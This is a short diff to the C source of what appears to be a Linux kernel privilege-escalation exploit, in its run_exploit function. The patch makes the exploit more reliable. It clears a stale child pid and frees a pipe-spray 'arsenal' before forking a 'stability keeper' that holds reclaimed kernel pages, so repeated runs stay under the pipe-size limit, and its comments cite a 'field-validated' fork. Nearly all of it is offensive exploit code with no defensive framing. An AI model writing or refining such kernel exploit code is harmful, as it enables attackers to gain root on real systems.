@@ -659,12 +659,24 @@ int run_exploit(int argc, char **argv) {
   if (pipe_prepare_child > 0) {
     SYSCHK(kill(pipe_prepare_child, SIGKILL));
     SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
+    /* clear the stale pid before any later reset_pipe_attempt: a reaped pid
+     * reused by another process would get killed, and waitpid would ECHILD
+     * (exit) on the success path (a54-fork main.c:447-451 does the same) */
+    pipe_prepare_child = -1;
   }
 #if defined(QEMU_STACK_WRITER_ONLY) && QEMU_STACK_WRITER_ONLY
   int exploit_ok = atomic_load(&cfi_stage_done);
 #else
   int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
   if (exploit_ok) {
+    /* Release the pipe arsenal before forking the keeper (a54-fork
+     * src/main.c:454-465, field-validated): F_SETPIPE_SZ growth is charged
+     * per-real-uid (fs.pipe-user-pages-soft), and the keeper would otherwise
+     * inherit hundreds of 32-slot pipes, pushing any subsequent run on this
+     * boot past the soft limit -> EPERM at the oracle resize. The keeper
+     * only needs to pin the memfd slabs and the payload skb. The disarm runs
+     * first inside reset_pipe_attempt while the alias is still live. */
+    reset_pipe_attempt();
     pid_t keeper = spawn_allocation_keeper();
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                keeper);
